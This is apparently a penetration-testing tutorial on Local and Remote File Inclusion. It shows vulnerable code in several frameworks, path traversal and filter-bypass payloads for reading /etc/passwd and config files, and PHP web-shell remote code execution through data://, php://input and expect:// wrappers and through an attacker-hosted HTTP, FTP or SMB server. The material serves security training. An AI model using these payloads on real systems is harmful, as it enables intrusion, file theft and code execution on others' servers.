---
title: "Local File Inclusion"
description: "Exploit LFI vulnerabilities to read files, leak credentials, and achieve remote code execution."
---

The most common place we usually find LFI is in templating engines. In order to have most of the web application looking the same when navigating between pages, a templating engine displays a page that shows the common static parts, such as the header, navigation bar, and footer, and then dynamically loads other content that changes between pages.

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FuCPqqnhEv2bFjAzY5WTb%252Fe37dfe6c-79cf-4f8c-a565-f3f55c6117d6.png%3Falt%3Dmedia%26token%3Ded4b67b9-834f-4f81-8699-e278a3bd1669&width=400&dpr=1&quality=100&sign=4ecfaaa1&sv=2" alt="Templating engine diagram" />

This is why we often see a parameter like `/index.php?page=about`, where `index.php` sets static content (e.g. header/footer), and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called `about.php`. As we have control over the `about` portion of the request, it may be possible to have the web application grab other files and display them on the page.

## Vulnerable Code

File Inclusion vulnerabilities can occur in many of the most popular web servers and development frameworks, like PHP, NodeJS, Java, .Net, and many others. Each of them has a slightly different approach to including local files, but they all share one common thing: loading a file from a specified path.

### PHP

In PHP, we may use the `include()` function to load a local or a remote file as we load a page.

If the path passed to the `include()` is taken from a user-controlled parameter, like a GET parameter, and the code does not explicitly filter and sanitize the user input, then the code becomes vulnerable to File Inclusion. The following code snippet shows an example of that:

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

There are many other PHP functions that would lead to the same vulnerability if we had control over the path passed into them. Such functions include `include_once()`, `require()`, `require_once()`, `file_get_contents()`, and several others as well.

### NodeJS

The following is a basic example of how a GET parameter `language` is used to control what data is written to a page:

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

As we can see, whatever parameter passed from the URL gets used by the `readfile` function, which then writes the file content in the HTTP response.

Another example is the `render()` function in the Express.js framework. The following example shows how the `language` parameter is used to determine which directory to pull the `about.html` page from:

```javascript
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

Unlike our earlier examples where GET parameters were specified after a `?` character in the URL, the above example takes the parameter from the URL path (e.g. `/about/en` or `/about/es`). As the parameter is directly used within the `render()` function to specify the rendered file, we can change the URL to show a different file instead.

### Java

The following examples show how web applications for a Java web server may include local files based on the specified parameter, using the `include` function:

```java
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

The `import` function may also be used to render a local file or a URL, such as the following example:

```java
<c:import url= "<%= request.getParameter('language') %>"/>
```

### .NET

The `Response.WriteFile` function works very similarly to all of our earlier examples, as it takes a file path for its input and writes its content to the response. The path may be retrieved from a GET parameter for dynamic content loading, as follows:

```asp
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %>
}
```

Furthermore, the `@Html.Partial()` function may also be used to render the specified file as part of the front-end template, similarly to what we saw earlier:

```asp
@Html.Partial(HttpContext.Request.Query['language'])
```

Finally, the `include` function may be used to render local files or remote URLs, and may also execute the specified files as well:

```asp
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

### Read vs Execute

From all of the above examples, we can see that File Inclusion vulnerabilities may occur in any web server and any development frameworks, as all of them provide functionalities for loading dynamic content and handling front-end templates.

The most important thing to keep in mind is that some of the above functions only read the content of the specified files, while others also execute the specified files. Furthermore, some of them allow specifying remote URLs, while others only work with files local to the back-end server.

The following table shows which functions may execute files and which only read file content:

| Function | Read Content | Execute | Remote URL |
|---|---|---|---|
| **PHP** | | | |
| `include()` / `include_once()` | ✓ | ✓ | ✓ |
| `require()` / `require_once()` | ✓ | ✓ | ✗ |
| `file_get_contents()` | ✓ | ✗ | ✓ |
| `fopen()` / `file()` | ✓ | ✗ | ✗ |
| **NodeJS** | | | |
| `fs.readFile()` | ✓ | ✗ | ✗ |
| `fs.sendFile()` | ✓ | ✗ | ✗ |
| `res.render()` | ✓ | ✓ | ✗ |
| **Java** | | | |
| `include` | ✓ | ✗ | ✗ |
| `import` | ✓ | ✓ | ✓ |
| **.NET** | | | |
| `@Html.Partial()` | ✓ | ✗ | ✗ |
| `@Html.RemotePartial()` | ✓ | ✗ | ✓ |
| `Response.WriteFile()` | ✓ | ✗ | ✗ |
| `include` | ✓ | ✓ | ✓ |

## Path Traversal

In the earlier example, we read a file by specifying its absolute path (e.g. `/etc/passwd`). This would work if the whole input was used within the `include()` function without any additions, like the following example:

```php
include($_GET['language']);
```

In this case, if we try to read `/etc/passwd`, then the `include()` function would fetch that file directly. However, in many occasions, web developers may append or prepend a string to the `language` parameter. For example, the language parameter may be used for the filename, and may be added after a directory, as follows:

```php
include("./languages/" . $_GET['language']);
```

In this case, if we attempt to read `/etc/passwd`, then the path passed to `include()` would be `(./languages//etc/passwd)`, and as this file does not exist, we will not be able to read anything:

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FpbNc1Oep4u5O3kL0Hd5R%252F%257BE40B5CE8-5435-4387-9483-1F2672E98941%257D.png%3Falt%3Dmedia%26token%3Dd1e3c2ff-f489-49e2-9ca4-72b1e1ac37a1&width=400&dpr=1&quality=100&sign=2d05767f&sv=2" alt="Path traversal error" />

We can easily bypass this restriction by traversing directories using relative paths. So, we can use this trick to go back several directories until we reach the root path (i.e. `/`), and then specify our absolute file path (e.g. `../../../../etc/passwd`), and the file should exist.

### Filename Prefix

On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:

```php
include("lang_" . $_GET['language']);
```

In this case, if we try to traverse the directory with `../../../etc/passwd`, the final string would be `lang_../../../etc/passwd`, which is invalid.

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252F8mreIPcW2zIuaa7SEFGB%252F%257BB313EDED-CE9B-4C4F-817C-5DA17F592FA6%257D.png%3Falt%3Dmedia%26token%3D76ea5365-2666-4163-8dd5-f0f56b6e1c26&width=400&dpr=1&quality=100&sign=6b90c7d&sv=2" alt="Filename prefix error" />

As expected, the error tells us that this file does not exist. So, instead of directly using path traversal, we can prefix a `/` before our payload, and this should consider the prefix as a directory. This may not always work, as in this example a directory named `lang_/` may not exist, so our relative path may not be correct.

### Appended Extensions

Another very common example is when an extension is appended to the `language` parameter, as follows:

```php
include($_GET['language'] . ".php");
```

This may also be safer as it may restrict us to only including PHP files. In this case, if we try to read `/etc/passwd`, then the file included would be `/etc/passwd.php`, which does not exist.

With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful e.g. for reading source code.

There are a couple of other techniques we may use, but they are obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4. However, it may still be beneficial to mention them, as some web applications may still be running on older servers, and these techniques may be the only bypasses possible.

#### Path Truncation

In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored.

Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call `(/etc/passwd/.)` then the `/.` would also be truncated, and PHP would call `(/etc/passwd)`. PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`). Similarly, a current directory shortcut (`.`) in the middle of the path would also be disregarded (e.g. `/etc/./passwd`).

If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (`.php`) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.

An example of such payload would be the following:

```
?language=non_existing_directory/../../../etc/passwd/./././././ [REPEATED ~2048 times]
```

Of course, we don't have to manually type `./` 2048 times (total of 4096 characters), but we can automate the creation of this string with the following command:

```bash
Dudji@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

#### Null Bytes

PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.

To exploit this vulnerability, we can end our payload with a null byte (e.g. `/etc/passwd%00`), such that the final path passed to `include()` would be `(/etc/passwd%00.php)`. This way, even though `.php` is appended to our string, anything after the null byte would be truncated, and so the path used would actually be `/etc/passwd`, leading us to bypass the appended extension.

## Second-Order Attacks

Another common, and a little bit more advanced, LFI attack is a Second Order Attack.

For example, a web application may allow us to download our avatar through a URL like `(/profile/$username/avatar.png)`. If we craft a malicious LFI username (e.g. `../../../etc/passwd`), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.

## Basic Bypasses

### Non-Recursive Path Traversal Filters

One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of `(../)` to avoid path traversals. For example:

```php
$language = str_replace('../', '', $_GET['language']);
```

The above code is supposed to prevent path traversal, and hence renders LFI useless.

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252Fc4g3KL0TRdl2lsN6bvKz%252F%257B3EB21394-E52F-47C1-8379-1008FE8E2F1F%257D.png%3Falt%3Dmedia%26token%3D81a47262-afac-460d-8b31-3d0a22c421de&width=400&dpr=1&quality=100&sign=624188d0&sv=2" alt="Non-recursive filter bypass" />

We see that all `../` substrings were removed, which resulted in a final path being `./languages/etc/passwd`. However, this filter is very insecure, as it is not recursively removing the `../` substring, as it runs a single time on the input string and does not apply the filter on the output string. For example, if we use `....//` as our payload, then the filter would remove `../` and the output string would be `../`, which means we may still perform path traversal.

The `....//` substring is not the only bypass we can use, as we may use `..././` or `....\/` and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. `....\/`), or adding extra forward slashes (e.g. `....////`)

### Encoding

Some web filters may prevent input filters that include certain LFI-related characters, like a dot `.` or a slash `/` used for path traversals. However, some of these filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function. Core PHP filters on versions 5.3.4 and earlier were specifically vulnerable to this bypass, but even on newer versions we may find custom filters that may be bypassed through URL encoding.

If the target web application did not allow `.` and `/` in our input, we can URL encode `../` into `%2e%2e%2f`, which may bypass the filter. To do so, we can use any online URL encoder utility or use the Burp Suite Decoder tool, as follows:

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FUWJXHzd3CsQYTZtmaNwp%252Fimage.png%3Falt%3Dmedia%26token%3D3c0e6189-0750-4f65-a641-daa8c80c03e3&width=400&dpr=1&quality=100&sign=ad1c945a&sv=2" alt="URL encoding with Burp Decoder" />

Furthermore, we may also use Burp Decoder to encode the encoded string once again to have a double encoded string, which may also bypass other types of filters.

### Approved Paths

Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the `./languages` directory, as follows:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

This regex means:
- `^` = start of the string
- `\.\/languages\/` = literally `./languages/`
- `.+` = at least one character after that
- `$` = end of the string

So the app is saying: *"I will only include files whose path starts with `./languages/`."*

Example "legit" inputs:
```
./languages/en.php
./languages/fr.php
```

If you give `/etc/passwd` it fails because it doesn't start with `./languages/`.

## PHP Filters

If we identify an LFI vulnerability in PHP web applications, then we can utilize different PHP Wrappers to be able to extend our LFI exploitation, and even potentially reach remote code execution.

PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. This is not only beneficial with LFI attacks, but also with other web attacks like XXE.

### Input Filters

PHP Filters are a type of PHP wrapper, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`.

The filter wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`. The `resource` parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the `read` parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.

There are four different types of filters available for use, which are String Filters, Conversion Filters, Compression Filters, and Encryption Filters. The filter that is useful for LFI attacks is the `convert.base64-encode` filter, under Conversion Filters.

#### Fuzzing for PHP Files

The first step would be to fuzz for different available PHP pages with a tool like `ffuf` or `gobuster`.

```bash
Dudji@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

#### Standard PHP Inclusion

If you tried to include any php files through LFI, you would have noticed that the included PHP file gets executed, and eventually gets rendered as a normal HTML page. For example, let's try to include the `config.php` page (`.php` extension appended by web application):

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252Fv3ufXr9uoWQYXDZ39lxQ%252F%257BBFCDD769-2F39-4787-8FD4-4B93BC331196%257D.png%3Falt%3Dmedia%26token%3Da8f29547-7f86-4361-b481-e6fb0a1d2fa1&width=400&dpr=1&quality=100&sign=62fccee5&sv=2" alt="Standard PHP inclusion - empty result" />

As we can see, we get an empty result in place of our LFI string, since the `config.php` most likely only sets up the web app configuration and does not render any HTML output.

This is where the base64 php filter gets useful, as we can use it to base64 encode the php file, and then we would get the encoded source code instead of having it being executed and rendered.

### Source Code Disclosure

Let's try to read the source code of `config.php` using the base64 filter, by specifying `convert.base64-encode` for the `read` parameter and `config` for the `resource` parameter, as follows:

```
php://filter/read=convert.base64-encode/resource=config
```

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FfjDhsemURzFz4wVc1DMP%252F%257BE093943D-D005-4148-B759-E0875B8213A2%257D.png%3Falt%3Dmedia%26token%3D816598de-2c59-46a4-baa0-c2e3ffd84b50&width=400&dpr=1&quality=100&sign=79998faa&sv=2" alt="Source code disclosure via base64 filter" />

We intentionally left the resource file at the end of our string, as the `.php` extension is automatically appended to the end of our input string, which would make the resource we specified be `config.php`.

We can now decode this string to get the content of the source code of `config.php`, as follows:

```bash
Dudji@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

...SNIP...

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

...SNIP...
```

## PHP Wrappers

We will utilize different PHP Wrappers to gain remote code execution.

### Data

The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the `(allow_url_include)` setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.

#### Checking PHP Configurations

To do so, we can include the PHP configuration file found at `(/etc/php/X.Y/apache2/php.ini)` for Apache or at `(/etc/php/X.Y/fpm/php.ini)` for Nginx, where X.Y is your install PHP version.

We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the base64 filter we used in the previous section, as `.ini` files are similar to `.php` files and should be encoded to avoid breaking.

```bash
Dudji@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Once we have the base64 encoded string, we can decode it and grep for `allow_url_include` to see its value:

```bash
Dudji@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

We see that we have this option enabled, so we can use the data wrapper. Knowing how to check for the `allow_url_include` option can be very important, as this option is not enabled by default, and is required for several other LFI attacks, like using the input wrapper or for any RFI attack.

**Remote Code Execution**

With `allow_url_include` enabled, we can proceed with our data wrapper attack. We can also pass it base64 encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.

So, our first step would be to base64 encode a basic PHP web shell, as follows:

```bash
Dudji@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:

```
http://<SERVER_IP>:/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252F3YZLH8CcdRjpC3NUsnKH%252F%257BD59C42B6-8ECD-47DE-A661-F0CD2A2221F7%257D.png%3Falt%3Dmedia%26token%3Dd4257f54-f757-4cd3-ada4-b6f141a689ba&width=400&dpr=1&quality=100&sign=1ef8a1ad&sv=2" alt="Data wrapper RCE" />

We may also use cURL for the same attack, as follows:

```bash
Dudji@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Input

Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code. The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the input wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

To repeat our earlier attack but with the input wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:

```bash
Dudji@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<Note>
  To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<?php system('id')?>`)
</Note>

### Expect

Finally, we may utilize the expect wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can check whether it is configured to load on the back-end server just like we did with `allow_url_include` earlier, but we'd grep for `expect` instead:

```bash
Dudji@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect

extension=expect
```

As we can see, the `extension=expect` directive is present in the configuration, which indicates the server is configured to attempt to load the expect extension. However, this doesn't guarantee the extension is actually functional at runtime, as it could fail to load due to a multitude of reasons.

Therefore, to confirm that it is actually available, we need to test it directly by attempting command execution using the `expect://` wrapper and then passing the command we want to execute, as follows:

```bash
Dudji@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Remote File Inclusion (RFI)

So far, we have been mainly focusing on Local File Inclusion (LFI). However, in some cases, we may also be able to include remote files "Remote File Inclusion (RFI)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:

- Enumerating local-only ports and web applications (i.e. SSRF)
- Gaining remote code execution by including a malicious script that we host

We will cover how to gain remote code execution through RFI vulnerabilities. The Server-side Attacks module covers various SSRF techniques, which may also be used with RFI vulnerabilities.

### Local vs. Remote File Inclusion

If we refer to the table, we see that the following are some of the functions that (if vulnerable) would allow RFI:

| Function | Read Content | Execute | Remote URL |
|---|---|---|---|
| **PHP** | | | |
| `include()` / `include_once()` | ✓ | ✓ | ✓ |
| `file_get_contents()` | ✓ | ✗ | ✓ |
| **Java** | | | |
| `import` | ✓ | ✓ | ✓ |
| **.NET** | | | |
| `@Html.RemotePartial()` | ✓ | ✗ | ✓ |
| `include` | ✓ | ✓ | ✓ |

As we can see, almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:

1. The vulnerable function may not allow including remote URLs
2. You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`)
3. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default

Furthermore, some functions do allow including remote URLs but do not allow code execution. In this case, we would still be able to exploit the vulnerability to enumerate local ports and web applications through SSRF.

### Verify RFI

Any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled. We can check whether this setting is enabled through LFI, as we did in the previous section:

```bash
Dudji@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content.

At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use `(http://127.0.0.1:80/index.php)` as our input string and see if it gets included:

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FMbmqaM0omqzqMr46bIF9%252F%257BF6F9D6B4-6900-4DCF-B974-620888BFFD69%257D.png%3Falt%3Dmedia%26token%3Da1bed2dc-3fbc-4f78-94be-bc14edac19dd&width=400&dpr=1&quality=100&sign=e420edd0&sv=2" alt="RFI verified with local URL" />

The page is indeed vulnerable to RFI, as we are able to include URLs. Furthermore, the `index.php` page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.

We also see that we were able to specify port 80 and get the web application on that port. If the back-end server hosted any other local web applications (e.g. port 8080), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it.

<Warning>
  It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.
</Warning>

### Remote Code Execution with RFI

We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell as we did in the previous section, which is what we will do in this case:

```bash
Dudji@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Now, all we need to do is host this script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like 80 or 443, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections. Furthermore, we may host the script through an FTP service or an SMB service, as we will see next.

#### HTTP

Now, we can start a server on our machine with a basic python server with the following command, as follows:

```bash
Dudji@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

Now, we can include our local shell through RFI, like we did earlier, but using `<OUR_IP>` and our `<LISTENING_PORT>`. We will also specify the command to be executed with `&cmd=id`:

```
http://<SERVER_IP>:/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FIxiDSgS6aV6TlKjEVpBw%252F%257B255E40EC-5177-44BD-A264-C3E8D9C4D1C4%257D.png%3Falt%3Dmedia%26token%3D55200903-1e50-4d56-a60c-255f49823f9f&width=400&dpr=1&quality=100&sign=9d499f45&sv=2" alt="RFI via HTTP" />

As we can see, we did get a connection on our python server, and the remote shell was included, and we executed the specified command. We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (`.php`) was appended to the request, then we can omit it from our payload.

#### FTP

As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's pyftpdlib, as follows:

```bash
Dudji@htb[/htb]$ sudo python -m pyftpdlib -p 21
[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

This may also be useful in case http ports are blocked by a firewall or the `http://` string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the `ftp://` scheme in the URL, as follows:

```
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FPUnHmcAS2T56Q67Ql3LR%252F%257B15B8AD77-1FE1-4C7A-AB9C-B975A6642326%257D.png%3Falt%3Dmedia%26token%3D667fc434-487d-4352-851f-b4376554c013&width=400&dpr=1&quality=100&sign=a15742ba&sv=2" alt="RFI via FTP" />

This worked very similarly to our http attack, and the command was executed. By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:

```bash
Dudji@htb[/htb]$ curl 'http://<SERVER_IP>:/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### SMB

If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

We can spin up an SMB server using Impacket's `smbserver.py`, which allows anonymous authentication by default, as follows:

```bash
Dudji@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), and specify the command with `(&cmd=whoami)` as we did earlier:

```
http://<SERVER_IP>:/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FIu8rQAiIKe1EdRSU0Tga%252F%257B883537DD-D6A7-453E-BDD1-7A5F333C6E98%257D.png%3Falt%3Dmedia%26token%3Dc6a74c2b-6451-4f55-90ea-f954d739d92d&width=400&dpr=1&quality=100&sign=c47c30e2&sv=2" alt="RFI via SMB" />

As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled.

<Note>
  This technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.
</Note>

## LFI and File Uploads

The File Upload Attacks module covers different techniques on how to exploit file upload forms and functionalities. However, for the attack we are going to discuss in this section, we do not require the file upload form to be vulnerable, but merely allow us to upload files.

If the vulnerable function has code Execute capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it instead of image data, and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.

As mentioned in the first section, the following are the functions that allow executing code with file inclusion, any of which would work with this section's attacks:

| Function | Read Content | Execute | Remote URL |
|---|---|---|---|
| **PHP** | | | |
